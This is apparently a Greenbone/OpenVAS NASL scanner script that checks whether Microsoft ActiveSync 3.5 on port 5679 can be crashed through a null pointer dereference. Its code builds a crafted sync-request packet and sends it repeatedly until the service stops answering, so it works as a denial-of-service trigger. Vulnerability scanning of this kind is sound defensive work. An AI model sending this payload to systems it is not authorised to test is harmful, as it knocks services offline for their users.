if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802462" );
	script_version( "2020-06-09T10:15:40+0000" );
	script_bugtraq_id( 7150 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-06-09 10:15:40 +0000 (Tue, 09 Jun 2020)" );
	script_tag( name: "creation_date", value: "2012-09-27 14:28:19 +0530 (Thu, 27 Sep 2012)" );
	script_name( "Microsoft ActiveSync Null Pointer Dereference Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 5679 );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/11589" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/8383" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/315901" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to cause denial
  of service condition." );
	script_tag( name: "affected", value: "Microsoft ActiveSync version 3.5." );
	script_tag( name: "insight", value: "The flaw is due to NULL pointer is dereferenced in a call to the
  function 'WideCharToMultiByte()' while it is trying to process an entry
  within the sync request packet. This causes an application error,
  killing the 'wcescomm' process." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Microsoft ActiveSync and is prone to denial
  of service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
port = 5679;
if(!get_port_state( port )){
	exit( 0 );
}
req = raw_string( 0x06, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00 ) + crap( 124 );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
for(i = 0;i < 3;i++){
	sock = open_sock_tcp( port );
	if( sock ){
		send( socket: soc, data: req );
		close( sock );
	}
	else {
		close( soc );
		security_message( port );
		exit( 0 );
	}
}

